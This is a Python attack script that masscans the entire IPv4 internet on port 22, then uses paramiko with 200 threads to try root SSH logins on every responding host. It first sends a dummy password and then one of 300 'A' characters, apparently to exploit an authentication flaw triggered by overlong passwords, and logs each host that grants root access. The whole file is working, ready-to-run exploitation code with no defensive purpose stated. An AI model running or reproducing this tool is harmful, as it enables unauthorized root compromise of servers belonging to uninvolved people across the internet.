#!/usr/bin/env python3
import subprocess
import paramiko
import re
import socket
from concurrent.futures import ThreadPoolExecutor

PASSWORD = "A" * 300
RESULTS_FILE = "success.txt"
SCAN_FILE = "scan_results.txt"
MAX_WORKERS = 200
IP_PATTERN = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')

def masscan():
    cmd = ["masscan", "0.0.0.0/0", "-p22", "--rate=300000", "--wait=130", "--exclude", "255.255.255.255", "-oL", SCAN_FILE]
    subprocess.run(cmd, check=True)

def try_login(ip):
    try:
        t = paramiko.Transport(socket.create_connection((ip, 22)))
        t.start_client(timeout=10)
        
        for pw in ("wrong", PASSWORD):
            try:
                t.auth_password("root", pw)
                if len(pw) == 300:
                    with open(RESULTS_FILE, "a") as f:
                        f.write(ip + "\n")
                    print(f"[+] {ip} root login OK")
                break
            except paramiko.AuthenticationException:
                pass
                
        t.close()
    except Exception:
        pass

def main():
    masscan()
    with open(SCAN_FILE) as f:
        content = f.read()
    
    ips = IP_PATTERN.findall(content)
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        list(pool.map(try_login, ips))

if __name__ == "__main__":
    main()

